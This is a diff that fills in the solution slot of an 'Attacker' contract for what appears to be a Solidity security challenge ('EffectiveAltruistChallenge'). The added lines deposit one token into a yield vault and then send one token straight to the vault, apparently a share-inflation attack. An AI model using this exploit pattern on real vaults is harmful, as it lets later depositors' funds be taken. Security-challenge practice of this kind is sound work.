@@ -17,8 +17,9 @@ contract Attacker {
     }
 
     function executeAttack() external {
-
-        /** CODE YOUR SOLUTION HERE */
-
+        // forge test -vvvvv --match-contract 'EffectiveAltruistChallenge'
+        _token.approve(address(_yieldOptimizerVault), 1);
+        _yieldOptimizerVault.deposit(1, address(this));
+        _token.transfer(address(_yieldOptimizerVault), 1);
     }
 }
